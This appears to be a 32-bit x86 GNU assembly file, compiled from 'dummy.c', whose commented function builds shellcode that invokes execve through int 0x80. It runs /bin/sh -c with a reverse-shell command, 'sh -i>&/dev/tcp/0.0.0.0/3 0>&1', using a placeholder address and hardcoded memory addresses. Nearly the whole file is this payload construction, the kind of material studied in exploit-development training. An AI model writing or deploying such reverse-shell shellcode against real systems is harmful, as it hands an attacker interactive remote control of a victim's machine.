	.file	"dummy.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp

	# This is where we construct our shellcode. In order to work
	# out the total to be disassembled we use: address of string
	# - address of jmp + string.

	# Call execve(). We build the array to be passed to execve()
	# on the stack.

	xorl	%eax,%eax		# Zero %eax

	movb	%al,0x80483a8		# NULL terminate "-c"
	movb	%al,0x80483a5		# NULL terminate /bin/sh	

	pushl	%eax			# Put NULL on the stack	
	pushl	$0x80483a9		# Put address of "bash ...." on stack
	pushl	$0x80483a6		# Put address of "-c" on stack
	pushl	$0x804839e		# Put address of "/bin/sh" on stack

	xorl	%edx, %edx		# NULL in %edx
	movl	$0xbffff117,%ecx	# Address of array in %ecx
	movl	$0x804839e,%ebx		# Address of /bin/sh in %ebx
	movb	$0xb,%al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode and invoke syscall

	.string	"/bin/sh\0-c\0sh -i>&/dev/tcp/0.0.0.0/3 0>&1"      # The string at:0x804839e	0x8048394
								   # "-c" at:0x80483a6		0x804839c
								   # "sh .." at:0x80483a9	0x804839f
	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	subl	%eax, %esp
	call	function
	movl	$0, %eax
	leave
	ret
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.6"
